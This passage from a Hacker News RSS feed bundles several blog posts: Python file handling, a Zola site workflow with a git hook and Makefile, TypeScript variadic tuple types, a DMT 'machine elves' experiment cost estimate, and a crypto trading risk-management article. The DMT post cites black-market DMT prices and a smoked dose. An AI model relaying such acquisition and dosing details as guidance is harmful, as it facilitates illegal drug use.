<p>Finally, let's address readability.  It could be argued (though it rarely is) that showing the reader when the file is closed has inherent value.  Conveniently, that tends to align with having opened the file for writing anyway, thereby needing an reference to it.  In which case, the readability is approximately equal, and potential pitfalls are more realistic.  But readability is genuinely lost when the file would have been opened in a inline expression.</p>
<p>The best practice is unjustifiably special-casing file descriptors, and not seeing its own reasoning through to its logical conclusion.  This author proposes advocating for <em>anonymous read-only</em> <code>open</code> expressions.  Your setup script is not going to run out of file descriptors because you wrote <code>open("README.md").read()</code>.</p>

</div>
</div>
</div>
</div>
    </div></div>]]>
            </description>
            <link>https://coady.github.io/posts/closing-files/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742390</guid>
            <pubDate>Sun, 05 Jul 2020 21:50:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Zola (static site generator) Workflow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23742328">thread link</a>) | @0xC45
<br/>
July 5, 2020 | https://0xc45.com/blog/my-zola-workflow/ | <a href="https://web.archive.org/web/*/https://0xc45.com/blog/my-zola-workflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<h2 id="overview">Overview</h2>
<p>To build this website, I use the <a href="https://www.getzola.org/">Zola static site engine</a>. So far, it has worked great. In this blog post, I will discuss my workflow improvements for using Zola, developing my blog posts, and publishing this website. As a quick intro, however, I will give a brief summary of the main features of Zola and why I chose to use it.</p>
<h3 id="what-is-zola">What is Zola?</h3>
<p>Zola advertises itself as a static site engine. It "compiles" Markdown content files, HTML templates (based on the <a href="https://tera.netlify.app/">Tera template engine</a>), and <a href="https://sass-lang.com/">Sass</a> styling into static HTML and CSS pages. This way, a Zola website does not require any server-side code to "render" the website pages.</p>
<p>In addition, Zola has several convenience features that one would want for a blog or website, such as built-in <a href="https://www.getzola.org/documentation/content/syntax-highlighting/">syntax highlighting</a>, simplified <a href="https://www.getzola.org/documentation/templates/pagination/">pagination</a>, and auto-generation of <a href="https://www.getzola.org/documentation/templates/feeds/">atom/rss feeds</a>.</p>
<p>So, Zola is an all-in-one tool for generating static websites. As a blog author, I can mainly focus on writing my blog post content (in Markdown). I don't have to worry too much about HTML syntax, CSS styling, linking, pagination, or my Atom feed (after the initial setup and creation of my site theme). When I'm done writing a blog post, I "generate" the static site with Zola. All of the repetitive and error-prone work is handled for me and the actual static website pages are produced.</p>
<h3 id="why-use-zola">Why use Zola?</h3>
<p>There are many competing static site generators out there. Zola is but one of many. Currently, Hugo and Jekyll are probably the two most popular static site generators. However, for this website, I chose to use Zola for a few reasons:</p>
<ul>
<li>It's simple. It doesn't have a ridiculous number of features that will confuse me and distract me from actually writing blog posts.</li>
<li>It's capable. It has all the feature that I need.</li>
<li>It's a relatively new project. Why not give it a try?</li>
</ul>
<h2 id="my-zola-workflow">My Zola Workflow</h2>
<p>Rather than repeat stuff you can find in the Zola documentation, in this blog post I will cover three of my personal "workflow hacks" for working with Zola. Hopefully at least a couple of these patterns are useful to you.</p>
<h3 id="git-pre-push-hook">Git pre-push Hook</h3>
<p>Because this blog is hosted on Github pages, <code>git push</code> is equivalent to publishing the site. Early on, I made the mistake of writing an entire blog post, but forgetting to "generate" the static site. So, I made a commit, pushed, and nothing happened.</p>
<p>To prevent myself from making this mistake again, I added a "pre-push" hook to my git repo. Now, git will refuse to push if the generated static site is out of date.</p>
<p>Here is my simple "pre-push" git hook:</p>
<pre><code><span>#!/usr/bin/env bash

</span><span>project_root</span><span>="$</span><span>( </span><span>git</span><span> rev-parse</span><span> --show-toplevel </span><span>)</span><span>"
</span><span>pushd </span><span>"$</span><span>{</span><span>project_root</span><span>}</span><span>" &amp;&gt; /dev/null || </span><span>exit</span><span> 1
</span><span>make </span><span>&amp;&gt; /dev/null
</span><span>num_diff_files</span><span>="$</span><span>( </span><span>git</span><span> diff</span><span> --name-only </span><span>| </span><span>wc -l </span><span>)</span><span>"
</span><span>num_untracked_files</span><span>="$</span><span>( </span><span>git</span><span> ls-files</span><span> --others --exclude-standard </span><span>| </span><span>wc -l </span><span>)</span><span>"
</span><span>if </span><span>[ </span><span>"$</span><span>{</span><span>num_diff_files</span><span>}</span><span>" != "</span><span>0</span><span>" </span><span>] </span><span>|| </span><span>[ </span><span>"$</span><span>{</span><span>num_untracked_files</span><span>}</span><span>" != "</span><span>0</span><span>" </span><span>] </span><span>; </span><span>then
  </span><span>echo </span><span>"</span><span>diff detected after running </span><span>\`</span><span>make</span><span>\`</span><span>, not pushing</span><span>"
  </span><span>exit</span><span> 1
</span><span>fi
</span><span>popd </span><span>&amp;&gt; /dev/null || </span><span>exit</span><span> 1
</span></code></pre>
<p>In summary, this git hook builds the site (with Zola) and then checks if any git diff is detected. If there is a git diff (or new, un-tracked file), the hook will prevent the <code>git push</code> from running.</p>
<p>As you might notice, this script depends on <code>make</code>. To build the website, I have a Makefile target (which will be discussed soon).</p>
<h3 id="docker-image">Docker Image</h3>
<p>Next, rather than install the <code>zola</code> binary on my base system, I decided to create a docker image that contains Zola. So, I now have a portable means to generate the site. In the future, I could potentially add some sort of continuous deployment automation to regenerate the site on every git push using this docker image. Additionally, the docker image locks Zola at a specific version (which I can be conscientious about upgrading).</p>
<p>Here is my Zola docker image: <a href="https://github.com/0xC45/zola-docker">https://github.com/0xC45/zola-docker</a>.</p>
<h3 id="makefile">Makefile</h3>
<p>Lastly, I use a Makefile to build the site. Because I use a docker image to run Zola, some of the commands are quite complicated. Particularly, it was somewhat difficult to set up UID/GID mapping and port binding. Using a Makefile documents the commands in code and saves me from having to remember them. Here is my Makefile:</p>
<pre><code><span>.PHONY</span><span>: all</span><span>
all</span><span>:</span><span>
	PROJECT_ROOT</span><span>=</span><span>"</span><span>$$(</span><span>git rev-parse --show-toplevel</span><span>)</span><span>" &amp;&amp; \
	docker run \
	  --rm \
	  -it \
	  -u </span><span>$$(</span><span>id -u </span><span>$${</span><span>USER</span><span>})</span><span>:</span><span>$$(</span><span>id -g </span><span>$${</span><span>USER</span><span>}) </span><span>\
	  -v "</span><span>$${</span><span>PROJECT_ROOT</span><span>}</span><span>:/site" \
	  zola:v0.11.0 \
	  bash -c 'cd /site &amp;&amp; zola build -o docs'</span><span>

.PHONY</span><span>: serve</span><span>
serve</span><span>:</span><span>
	PROJECT_ROOT</span><span>=</span><span>"</span><span>$$(</span><span>git rev-parse --show-toplevel</span><span>)</span><span>" &amp;&amp; \
	docker run \
	  --rm \
	  -it \
	  -u </span><span>$$(</span><span>id -u </span><span>$${</span><span>USER</span><span>})</span><span>:</span><span>$$(</span><span>id -g </span><span>$${</span><span>USER</span><span>}) </span><span>\
	  -v "</span><span>$${</span><span>PROJECT_ROOT</span><span>}</span><span>:/site" \
	  -p 127.0.0.1:1111:1111 \
	  zola:v0.11.0 \
	  bash -c 'cd /site &amp;&amp; zola serve -i 0.0.0.0'</span><span>

.PHONY</span><span>: </span><span>clean
</span><span>clean</span><span>:
	</span><span>rm -rf docs/
</span></code></pre>
<p>There are three main targets: <code>all</code>, <code>serve</code>, and <code>clean</code>.</p>
<ul>
<li><code>all</code>: This target generates the static site.</li>
<li><code>serve</code>: This target runs a "development" server on my local machine, allowing me to preview changes.</li>
<li><code>clean</code>: This target deletes the directory containing the generated static site.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>So, there you have it. These are my custom workflow improvements for using the Zola static site engine. So far, Zola has been a fantastic utility for generating my blog site. Of course, it does not have all the features of other popular static site generators, but it's perfect for my use case. It's simple, easy to use, fast, and capable. I definitely recommend checking it out.</p>

    </section></div>]]>
            </description>
            <link>https://0xc45.com/blog/my-zola-workflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742328</guid>
            <pubDate>Sun, 05 Jul 2020 21:43:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Experimenting with TypeScript 4.0's Variadic Tuple Types (Variadic Kinds)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23742046">thread link</a>) | @munchor
<br/>
July 5, 2020 | https://davidgomes.com/refactoring-some-code-to-use-typescripts-variadic-functions/ | <a href="https://web.archive.org/web/*/https://davidgomes.com/refactoring-some-code-to-use-typescripts-variadic-functions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        




<main id="site-main" role="main">
    <div>

        <article>

            


            <section>
                <p>I wrote some code over 2 years ago that can't be properly typed with either <a href="https://flow.org/">Flow</a> or <a href="https://www.typescriptlang.org/">TypeScript</a>, but with the introduction of <a href="https://github.com/microsoft/TypeScript/pull/39094">Variadic Tuple Types</a> coming in TypeScript 4.0, I decided to give this piece of code a second look.</p><p>We have a function called <code>innerJoin</code> which takes in 2+N arguments:</p><ol><li>A <code>comparator</code> function</li><li>A <code>merge</code> function</li><li>A variadic list of arrays that all have to be sorted the same way: <code>...arrs</code></li></ol><p>The inner join function loops through all of the arrays "at the same time", looks for items that need to be merged based on some "join predicate" (the <code>comparator</code> function) and then calls the <code>merge</code> function with all of those items to generate a "merged" item that will go on the end result array.</p><p>Here's an example of how to use this function in a very simple test case:</p><pre><code>function idComparator(a: { id: number }, b: { id: number }) {
    if (a.id &lt; b.id) {
        return -1;
    } else if (a.id === b.id) {
        return 0;
    } else {
        return 1;
    }
}

const array1 = [
    {
        id: 1,
        name: "David",
    },
    {
        id: 2,
        name: "Miguel",
    },
];

const array2 = [
    {
        id: 1,
        country: "Portugal",
    },
    {
        id: 2,
        country: "Portugal",
    },
    {
        id: 3,
        country: "USA",
    },
];

expect(
    innerJoin(idComparator, (a, b) =&gt; ({ ...a, ...b }), array1, array2)
).toEqual([
    {
        id: 1,
        name: "David",
        country: "Portugal",
    },
    {
        id: 2,
        name: "Miguel",
        country: "Portugal",
    },
]);
</code></pre><p>As you can see, a match was found for items 1 and 2, which resulted in a "merge" and item 3 was only present in one of the arrays, so it doesn't appear in the end result. A visualization of this algorithm can be seen here:</p><figure><img src="https://davidgomes.com/content/images/2020/05/merge_join.gif" alt=""></figure><p>So, how was this function implemented? (The comments should explain everything you need to know)</p><p><strong>inner-join.js</strong></p><p>(Notice that this is a JavaScript file which means that any potential type errors on it will go unnoticed)</p><pre><code>// This file's type definitions live in inner-join.d.ts, as we need to separate
// the type definition from the type implementation.

import _ from "lodash";

// All the arrays have to be sorted the same way. If not, the behavior
// of this function is *undefined*.
//
// A good visualization of this algorithm can be found here:
// http://sqlity.net/wp-content/uploads/2012/12/merge-join-algorithm.gif.
export default function innerJoin(comparator, merge, ...arrs) {
    const output = [];

    let iterators = _.fill(Array(arrs.length), 0);

    // We should only continue looping if none of the pointers is
    // at the end of their respective array. This is because we can
    // only match if we have a value from each array.
    const canContinue = () =&gt;
        _.every(arrs, (arr, index) =&gt; iterators[index] &lt; arr.length);

    // Gets all the current values by grabbing the value we are
    // currently pointing to for each array.
    const getAllValues = () =&gt;
        _.map(arrs, (arr, index) =&gt; arr[iterators[index]]);

    // Tests whether all current values match by comparing all of them
    // against the first element.
    const allValuesEqual = () =&gt;
        _.every(
            arrs,
            (arr, index) =&gt;
                comparator(arrs[0][iterators[0]], arr[iterators[index]]) === 0
        );

    while (canContinue()) {
        const values = getAllValues();
        const comparison = allValuesEqual();

        if (comparison) {
            output.push(merge(...values));
            iterators = _.map(iterators, it =&gt; ++it);
        } else {
            let minimumIndex = 0;

            let i;
            for (i = 1; i &lt; arrs.length; i++) {
                if (
                    comparator(
                        arrs[i][iterators[i]],
                        arrs[minimumIndex][iterators[minimumIndex]]
                    ) === -1
                ) {
                    minimumIndex = i;
                }
            }

            iterators[minimumIndex]++;
        }
    }

    return output;
}</code></pre><p>As you can see on the very first line of the <code>inner-join.js</code> file, the type definitions for this file live elsewhere: in <code>inner-join.d.ts</code>. Let's see what that file looks like:</p><p><strong>inner-join.d.ts</strong></p><pre><code>export default function innerJoin&lt;T1, T2, T3&gt;(
    comparator: (first: T1, second: T2) =&gt; -1 | 0 | 1,
    merge: (first: T1, second: T2) =&gt; T3,
    arr1: Array&lt;T1&gt;,
    arr2: Array&lt;T2&gt;
): Array&lt;T3&gt;;

export default function innerJoin&lt;T1, T2, T3, T4&gt;(
    comparator: (first: T1, second: T2 | T3) =&gt; -1 | 0 | 1,
    merge: (first: T1, second: T2, third: T3) =&gt; T4,
    arr1: Array&lt;T1&gt;,
    arr2: Array&lt;T2&gt;,
    arr3: Array&lt;T3&gt;
): Array&lt;T4&gt;;</code></pre><p>The <code>innerJoin</code> function is generic over an arbitrary number of types, so typing it alongside its implementation without variadic tuple types is not possible. So, we had to move its type definitions to a separate file. On the separate file, we hand-type the function's type definition for 4 and 5 arguments. If we ever need to call this function with more arguments, we'll have to manually add more type definitions in this file.</p><p>While this isn't great, it's also not a huge problem since we can easily generate 20 or 30 of these type definitions and not have to worry about it for a long time. Some open source libraries like <a href="https://github.com/reduxjs/reselect">reselect</a> have been doing <a href="https://github.com/reduxjs/reselect/blob/36f256b59b876705144147d409a73a3c4cb3c64d/src/index.d.ts#L21">this as well</a> for a long time.</p><h2 id="rewriting-our-code-using-typescript-4-0-s-variadic-tuple-types">Rewriting our code using TypeScript 4.0's Variadic Tuple Types</h2><p>The first thing we have to define is what <code>innerJoin</code> is generic <em>over.</em> That's easy, it is generic over 2 "things":</p><ul><li>A tuple type corresponding to the types of all the arrays that will be passed in (e.g., if generic over <code>[A, C]</code>, then it must receive as arguments <code>[Array&lt;A&gt;, Array&lt;C&gt;]</code>.</li><li>The output type of the join (e.g., if generic over <code>M</code>, it must return <code>Array&lt;M&gt;</code>).</li></ul><p>We can easily express this as:</p><pre><code>export default function innerJoin&lt;
    T extends unknown[], 
    MergedType
&gt;(
    ...
): MergedType { ... }</code></pre><p>Now let's think about the input types:</p><ul><li>The <code>comparator</code> function which receives 2 arguments: an element from the first array and an element from either one of the remaining arrays. This function has to return 0, -1 or 1.</li><li>The <code>merge</code> function which receives N arguments: on element from each of the input arrays. This function has to return an instance of <code>MergedType</code>.</li><li><code>arrs</code>: the list of input arrays.</li></ul><p>The <code>comparator</code> is a function that receives an argument with type <code>T[0]</code> (the type of the first element in the tuple) and another argument with the union type of all the other types in <code>T[1...N]</code>. We can use <code><a href="https://dev.to/kjleitz/comment/gb5d">DropFirstInTuple</a></code> and then use the <code>A[number]</code> syntax. What this syntax means is that we want to get the type of what we can index out of <code>A</code> with a <code>number</code> — if <code>A</code> is a tuple, then <code>A[number]</code> will correspond to the union type of all the element types of <code>A</code>). Here's all of that together:</p><pre><code>export default function innerJoin&lt;
    T extends unknown[], 
    MergedType
&gt;(
    comparator: (t1: T[0], tOther: DropFirstInTuple&lt;T&gt;[number]) =&gt; -1 | 0 | 1,
    ...
): MergedType { ... }</code></pre><p>(The <code>DropFirstInTuple</code> type was written by <a href="https://github.com/kjleitz">Keegan Leitz</a>, and I found it <a href="https://dev.to/kjleitz/comment/gb5d">here</a>)</p><p>The <code>merge</code> function is fairly simple to type:</p><pre><code>export default function innerJoin&lt;
    T extends unknown[], 
    MergedType
&gt;(
    comparator: (t1: T[0], tOther: DropFirstInTuple&lt;T&gt;[number]) =&gt; -1 | 0 | 1,
    merge: (...t: T) =&gt; MergedType,
    ...
): MergedType { ... }</code></pre><p>The list of input <code>arrs</code> is a little bit more challenging to type:</p><pre><code>export default function innerJoin&lt;
    T extends unknown[], 
    MergedType
&gt;(
    comparator: (t1: T[0], tOther: DropFirstInTuple&lt;T&gt;[number]) =&gt; -1 | 0 | 1,
    merge: (...t: T) =&gt; MergedType,
    ...arrs: { [K in keyof T]: Array&lt;T[K]&gt; }
): MergedType { ... }</code></pre><p><code>{ [K in keyof T]: Array&lt;T[K]&gt; }</code> can be explained as follows:</p><blockquote>For each key of <code>T</code> (<code>T</code> is a tuple type, so the keys are numbers like 0, 1, 2, etc.), we need the value to be an <code>Array&lt;T[K]&gt;</code>.</blockquote><p>To exemplify, if <code>T</code> is <code>[A, C]</code> then <code>{ [K in keyof T]: Array&lt;T[K]&gt; }</code> will be <code>[Array&lt; A&gt;, Array&lt;C&gt;]</code>.</p><p>Using TypeScript 4.0, we've been able to type our <code>innerJoin</code> function! However, there is a TypeScript error further down in the file:</p><pre><code>...
    const getAllValues = () =&gt;
        arrs.map((arr, index) =&gt; arr[iterators[index]]);

...

    if (comparison) {
        output.push(merge(...values));
...</code></pre><pre><code>Argument of type 'unknown[]' is not assignable to parameter of type 'T'.
  'unknown[]' is assignable to the constraint of type 'T', but 'T' could be instantiated with a different subtype of constraint 'unknown[]'.</code></pre><p>So the issue is that the TypeScript type checker doesn't understand that <code>getAllValues</code> returns a value of type <code>T</code>. If we try to annotate the output of <code>getAllValues</code> as <code>T</code>, we get the same error. The core issue is that we're <strong>mapping</strong> over a tuple type and so TypeScript just can't guess that the return type of <code>map</code> will be of type <code>T</code> since that would require the type checker understanding that <code>map</code> is an ordered traversal over a finite set of elements.</p><p>To get around this, we need to use a (dreaded) type assertion:</p><pre><code>// Gets all the current values by grabbing the value we are
// currently pointing to for each array.
// TYPE ASSERTION: This function leverages a type assertion which is
// something one should never do as they are not type safe. However, there
// is no other way to map over a tuple type and return another tuple type.
const getAllValues = () =&gt;
    arrs.map((arr, index) =&gt; arr[iterators[index]]) as T;</code></pre><p>And that's it! Here's the final <code>inner-join.ts</code>:</p><pre><code>// This file's type definitions live in inner-join.d.ts, as we need to separate
// the type definition from the type implementation.

import _ from "lodash";

// CREDIT to https://github.com/kjleitz for this type:
// https://dev.to/kjleitz/comment/gb5d

// Drops the first element of a tuple. Example:
//
//   type Foo = DropFirstInTuple&lt;[string, number, boolean]&gt;;
//   //=&gt; [number, boolean]
//
export type DropFirstInTuple&lt;T extends any[]&gt; = ((...args: T) =&gt; any) extends (arg: any, ...rest: infer U) =&gt; any ? U : T;

// All the arrays have to be sorted the same way. If …</code></pre></section></article></div></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://davidgomes.com/refactoring-some-code-to-use-typescripts-variadic-functions/">https://davidgomes.com/refactoring-some-code-to-use-typescripts-variadic-functions/</a></em></p>]]>
            </description>
            <link>https://davidgomes.com/refactoring-some-code-to-use-typescripts-variadic-functions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23742046</guid>
            <pubDate>Sun, 05 Jul 2020 21:13:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Estimated Cost of the DMT Machine Elves Prime Factorization Experiment]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23741946">thread link</a>) | @palimpsests
<br/>
July 5, 2020 | https://qualiacomputing.com/2018/10/15/estimated-cost-of-the-dmt-machine-elves-prime-factorization-experiment/ | <a href="https://web.archive.org/web/*/https://qualiacomputing.com/2018/10/15/estimated-cost-of-the-dmt-machine-elves-prime-factorization-experiment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<blockquote><p>“Okay,” I said. “Fine. Let me tell you where I’m coming from. I was reading&nbsp;<a href="https://www.psychologytoday.com/blog/unique-everybody-else">Scott McGreal’s blog</a>, which has some&nbsp;<a href="https://www.psychologytoday.com/blog/unique-everybody-else/201210/dmt-aliens-and-reality-part-1">good</a>&nbsp;<a href="https://www.psychologytoday.com/blog/unique-everybody-else/201210/dmt-aliens-and-reality-part-2">articles</a>&nbsp;about so-called DMT entities, and mentions how they seem so real that users of the drug insist they’ve made contact with actual superhuman beings and not just psychedelic hallucinations. You know,&nbsp;<a href="http://smile.amazon.com/gp/product/0062506528/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=390957&amp;creativeASIN=0062506528&amp;linkCode=as2&amp;tag=slastacod-20&amp;linkId=BKGSPUHIEWFDXXWZ">the usual</a><img src="http://ir-na.amazon-adsystem.com/e/ir?t=slastacod-20&amp;l=as2&amp;o=1&amp;a=0062506528" alt="" width="1" height="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">&nbsp;Terence McKenna stuff. But in&nbsp;<a href="https://www.psychologytoday.com/blog/unique-everybody-else/201408/dmt-gateway-reality-fantasy-or-what">one</a>&nbsp;of them he mentions a paper by Marko Rodriguez called&nbsp;<a href="http://www.ayahuasca-info.com/data/articles/paralleldmt.pdf"><i>A Methodology For Studying Various Interpretations of the N,N-dimethyltryptamine-Induced Alternate Reality</i></a>, which suggested among other things that you could prove DMT entities were real by taking the drug and then asking the entities you meet to factor large numbers which you were sure you couldn’t factor yourself. So to that end, could you do me a big favor and tell me the factors of 1,522,605,027, 922,533,360, 535,618,378, 132,637,429, 718,068,114, 961,380,688, 657,908,494, 580,122,963, 258,952,897, 654,000,350, 692,006,139?</p>
<p>– <a href="http://slatestarcodex.com/2015/04/21/universal-love-said-the-cactus-person/">Universal Love, Said the Cactus Person</a>, by <a href="http://slatestarcodex.com/">Scott Alexander</a></p></blockquote>
<p>In the comments…</p>






<p>I was a little curious about how such a prime experiment would go and how much it would cost. It looks like one could probably run an experiment with a somewhat OK chance at success for under $1k.</p>
<p>We need to estimate the costs and probabilities of memorizing a suitable composite number, buying DMT, using DMT and getting the requisite machine-elf experience (far from guaranteed), being able to execute a preplanned action like asking about a prime, and remembering the answer.</p>
<div>
<p>1. The smallest RSA number not <a href="https://en.wikipedia.org/wiki/RSA_numbers#RSA-220">yet factored is 220 digits</a>. The RSA numbers themselves are useless for this experiment because if one did get the right factors, because it’s so extraordinarily unlikely for machine-elves to really be an independent reality, a positive result would only prove that someone had stolen the RSA answers or hacked a computer or something along the lines. RSA-768 was factored in 2009 using ~2000 CPU-years, so we need a number much larger; since Google has several million CPUs we might want something substantially larger, at least 800 digits. We know from mnemonists that numbers that large can be routinely memorized, and an 800 digit decimal can be <a href="http://www.recordholders.org/en/list/memory.html#numbers-1h">memorized in an hour</a>.&nbsp;Chao Lu memorized <a href="http://www.pi-world-ranking-list.com/lists/details/luchaointerview.html">67k digits of Pi in 1 year</a>. So the actual memorization time is not significant. How much training does it take to memorize 800 digits? I remember a famous example in WM research of how WM training does not necessarily transfer to anything, of a student taught to memorize digits, <a href="https://www.cmu.edu/dietrich/psychology/">Ericsson &amp; Chase</a>’s&nbsp;whose digit span went from ~7 to ~80 after 230 hours of training; digit span is much more demanding than a one-off memorization. <a href="https://publishup.uni-potsdam.de/opus4-ubp/frontdoor/deliver/index/docId/3846/file/1987_mnemonic.pdf">This</a> does something similar using more like 80 hours of training. Foer’s _Moonwalking With Einstein: The Art and Science of Remembering Everything_ doesn’t cover much more than a year or two and fairly undemanding training regimen, and he performed well. So I’m going to guess that to memorize a number which would be truly impressive evidence (and not simply evidence for a prank or misdeeds by a hobbyist, RSA employee, Google, or the NSA) would require ~30h of practice.<br>
2. some browsing of the DMT category on the current leading black-market suggests that 1g of DMT from a reputable seller costs ฿0.56 or ~$130. The linked paper says smoking DMT for a full trip requires 50mg/0.05g so our $130 buys ~19 doses.<br>
3. The <a href="http://www.ayahuasca-info.com/data/articles/paralleldmt.pdf">linked paper</a>&nbsp;says that 20% of Strassman’s injected-DMT trips give a machine-elf experience; hence the 1g will give an average of ~3-4 machine-elfs and 19 trips almost guarantees at least 1 machine-elf assuming 20% success-rate (1-(1-0.2)^19 = 98%). Since the 20% figure comes from injected DMT and DMT of a controlled high quality, probably this is optimistic for anyone trying out smoking DMT at home, but let’s roll with it.<br>
4. in a machine-elf experience, how often could we be lucid enough to wake up and ask the factoring question? No one’s mentioned trying so there’s no hard data, but we can borrow from a similar set of experiments in verifying altered states of consciousness, Laberge’s lucid dreaming experiments in which subjects had to exert control to wiggle their eyes in a fixed pattern. <a href="http://diyhpl.us/~bryan/papers2/dreaming/Lucidity%20Institute%20Research%20Papers.pdf#page=163">This study</a> gives several flows from # of nights to # of verifications, which all are roughly 1/3 – 1/4; so given our estimated 3-4 machine-elfs, we might be able to ask 1 time. If the machine-elves are guaranteed to reply correctly, then that’s all we need.<br>
5. at 30 hours of mnemonic labor valued at minimum wage of $8 and $130 for 19 doses, that gives us an estimate of $370 in costs to ask an average of once; if we amortize the memorization costs some more by buying 2g, then we instead spend $250 per factoring request for 2 tries; and so on down to a minimum cost of (130/19)*5 = $34 per factoring request. To get n=10 requests, we’d need to spend a cool ((30*8) + 10*130)=$1540.<br>
6. power analysis for a question like this is tricky, since we only need one response with the *right* factors; probably what will happen is that the machine-elfs will not answer or any answer will be ‘forgotten’. You can estimate other stuff like how likely the elves are to respond given 10 questions and 0 responses (flat prior’s 95% CI: 0-28%), or apply decision-theory to decide when to stop trying (tricky, since any reasonable estimate of the probability of machine-elves will tell you that at $35 a shot, you shouldn’t be trying at all).</p>
<p>Hence, you could get a few attempts at somewhere under $1k, but exactly how much depends sensitively on what fraction of trips you get elves and how often you manage to ask them; the DMT itself doesn’t cost *that* much per dose (like ~$7) but it’s the all the trips where you don’t get elves or you get elves but are too ecstatic to ask them anything which really kill you and drive up the price to $34-$250 per factoring request. Also, there’s a lot of uncertainty in all these estimates (who knows how much any of the quoted rates differ from person to person?).</p>
<p>I thought this might be a fun self-experiment to do, but looking at the numbers and the cost, it seems pretty discouraging.</p>
<hr>
<p><strong>Related Empirical Paradigms for Psychedelic Research</strong>:</p>
<ol>
<li><a href="https://qualiacomputing.com/2016/10/29/lsd-and-quantum-measurements-can-you-see-schrodingers-cat-both-dead-and-alive-on-acid/">LSD and Quantum Measurement</a> (an experiment that was designed, coded up, and conducted to evaluate whether one can experience multiple Everett branches at once while on LSD).</li>
<li><a href="https://qualiacomputing.com/2015/05/22/how-to-secretly-communicate-with-people-on-lsd/">How to Secretly Communicate with People on LSD</a>&nbsp;(a method called <em>Psychedelic Cryptography</em>&nbsp;which uses the slower qualia decay factor induced by psychedelics, aka. “tracers”, in order to encode information in gifs that you can only decode if you are sufficiently high on a psychedelic).</li>
<li><a href="https://qualiacomputing.com/2015/04/20/psychophysics-for-psychedelic-research-textures/">Psychophysics for Psychedelic Research: Textures</a>&nbsp;(an experimental method developed by <a href="http://cvcl.mit.edu/SUNSeminar/Balas_texture_VR06.pdf">Benjamin Bala</a>&nbsp;based on the <a href="http://www.cns.nyu.edu/~lcv/texture/">textural&nbsp;mongrel</a> paradigm proposed by&nbsp;<a href="http://www.cns.nyu.edu/~eero/">Eero Simoncelli</a>&nbsp;and extended to provide insights into psychedelic visual perception. See: <a href="http://scarlet.stanford.edu/teach/index.php/Psychophysical_assessments_of_Portilla_and_Simoncelli's_texture_synthesis_algorithm">analysis</a>).</li>
</ol>
</div>
					</div></div>]]>
            </description>
            <link>https://qualiacomputing.com/2018/10/15/estimated-cost-of-the-dmt-machine-elves-prime-factorization-experiment/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23741946</guid>
            <pubDate>Sun, 05 Jul 2020 21:01:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Risk management and RR ratio in trading, a quantitative approach]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23741918">thread link</a>) | @ohlongjohn
<br/>
July 5, 2020 | https://sublimetraders.com/cryptocurrency-market-analysis/risk-management-ratio-sizing-crypto-trades/ | <a href="https://web.archive.org/web/*/https://sublimetraders.com/cryptocurrency-market-analysis/risk-management-ratio-sizing-crypto-trades/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    
<p><strong>Contents in this article:</strong></p>



<ol><li><a href="#introduction">Opening note</a></li><li><a href="#portfolio">Portfolio</a></li><li><a href="#acc-size">Account Size</a></li><li><a href="#acc-risk">Account Risk</a></li><li><a href="#trade-risk">Trade Risk</a></li><li><a href="#pos-size">Position Sizing</a></li><li><a href="#final">Final Word</a></li></ol>



<h2 id="introduction">Introduction </h2>



<p>Be it small or large, any kind of portfolio needs proper risk management. The whole point of risk management is to allow you to continue trading, as simple as that. It keeps you for making repeated mistakes that can otherwise blow up your account . Keep in mind that one poorly managed trade can wipe out months or even years of consistent positive trading.</p>



<p>The basis of risk management is that it helps avoid making emotional decisions because we do make those type of decisions, we are either hyped or scared to win or lose more assets. With a strict trading plan your trading and investment decisions can be regulated easily. Coming up with a set of rules is the best way to go, each of us is different so not all the rules are the same but a few of them apply to everyone.</p>



<p>These rules have the purpose of managing risk, and eliminate rash decisions, they will allow you to stay in the game more than you would without them.</p>



<p>When creating your risk system you will need to take in mind factors like investment timeframe, risk tolerance, and how much you can risk. An important aspect that you should not forget is that recovering losses is more difficult than creating small profits. Psychologically it plays an enormous pressure on us to know that we started at $1000, we are down at $600 and we need to recover the initial investment. Some even go as far as quitting straight away after the first losses. Everything here is tied toghether, risk, psychology, trade amount, etc. We’ll dive deeper into the subject.</p>



<h2 id="portfolio">Portfolio</h2>



<p>A portfolio is the mix of all assets you hold or want to invest into. Portfolio diversification is a very important aspect of diversification and should be taken very seriously. A correctly diversified portfolio holds assets from real state to cryptocurrency (eg. Bitcoin, Ethereum, XRP). The portfolio can also be a division of trading accounts across different exchanges or brokers.</p>



<p>How about testing our services for free for&nbsp;<strong>7 days</strong>? Go for it, worst case scenario – you learn something new 👉 <a rel="noreferrer noopener" href="https://t.me/sublime_signals_payment_bot" target="_blank"><strong>interact with our bot</strong></a></p>



<h2 id="acc-size">Account Size</h2>



<p>Simple as it may sound, the account size is very important in risk management. The account size is part of your portfolio risk management plan. For beginners it is important to calculate, allocate and split the  account size into multiple smaller accounts. Multiple accounts, multiple strategies. Consider it as A/B testing, each account with it’s own starting balance, it’s own strategy. At the end of the month compare the winners with the losers and see what worked best…. <em><strong>Improvise, overcome, adapt.</strong></em> This also removes the possibility of risking too much.</p>



